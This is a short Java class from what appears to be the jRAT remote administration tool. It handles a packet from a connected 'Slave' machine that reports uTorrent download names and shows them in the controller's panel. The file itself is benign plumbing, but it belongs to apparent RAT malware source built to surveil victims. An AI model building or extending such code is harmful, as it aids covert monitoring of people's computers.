package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.FrameControlPanel;
import se.jrat.client.ui.panels.PanelControluTorrentDownloads;


public class Packet40UTorrentDownload extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String name = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControluTorrentDownloads panel = (PanelControluTorrentDownloads) frame.panels.get("utorrent downloads");
			panel.getModel().addRow(new Object[] { panel.getIcon(), name });
		}
	}

}
